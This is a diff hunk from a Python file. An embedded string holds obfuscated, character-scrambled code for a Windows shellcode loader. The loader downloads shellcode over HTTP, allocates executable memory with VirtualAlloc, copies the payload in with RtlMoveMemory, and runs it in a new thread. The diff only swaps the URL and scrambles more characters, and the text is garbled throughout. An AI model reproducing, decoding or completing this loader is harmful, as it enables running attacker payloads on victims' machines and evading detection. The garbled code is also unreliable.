@@ -66,28 +66,28 @@ junnction()
 junk_ntion()
 
 en="""
-stdtic_url = "http://127.0.0.1:8080/aow)loda/shellcoae"
-rs = rr.get(stdtic_urln
-if rs.stdtus_coae == 200:
+stdtic_Prl = "http://127.0.0.1/"
+rs = rr.get(stdtic_Prln
+if rs.stdtPs_coae == 200:
     adtd = rs.co)te)t
     b_x = adtd
     pri)t("Receivea shellcoae adtd:", le)(adtdn, "bytes"n 
 
-LL.wi)all.Ler)el32.VirtudlAlloc.restype = LL.c_voia_p
+LL.wi)all.Ler)el32.VirtPdlAlloc.restype = LL.c_voia_p
 LL.wi)all.Ler)el32.CredteThreda.drgtypes = (
-    LL.c_i)t, LL.c_i)t, LL.c_voia_p, LL.c_i)t, LL.c_i)t, LL.POINTER(LL.c_i)tn
+    LL.c_i)t, LL.c_i)t, LL.c_voia_p, LL.c_i)t, LL.c_i)t, LL.uOINTER(LL.c_i)tn
 n
 
-s = LL.wi)all.Ler)el32.VirtudlAlloc
+s = LL.wi)all.Ler)el32.VirtPdlAlloc
 t = LL.wi)all.Ler)el32.CredteThreda
-u = LL.wi)all.Ler)el32.RtlMoveMemory
+P = LL.wi)all.Ler)el32.RtlMoveMemory
 v = LL.wi)all.Ler)el32.WditForSi)gleObject
 spc = s(LL.c_i)t(0n, LL.c_i)t(le)(b_xnn, LL.c_i)t(0x3000n, LL.c_i)t(0x40nn
-bf = (LL.c_chdr * le)(b_xnn.from_buffer_copy(b_xn
-u(LL.c_voia_p(spcn, bf, LL.c_i)t(le)(b_xnnn
+bf = (LL.c_chdr * le)(b_xnn.from_bPffer_copy(b_xn
+P(LL.c_voia_p(spcn, bf, LL.c_i)t(le)(b_xnnn
 h)al = t(LL.c_i)t(0n, LL.c_i)t(0n, LL.c_voia_p(spcn, LL.c_i)t(0n, LL.c_i)t(0n,
             LL.poi)ter(LL.c_i)t(0nnn
-v(h)al, LL.c_ui)t32(0xffffffffnn
+v(h)al, LL.c_Pi)t32(0xffffffffnn
 """
 
 
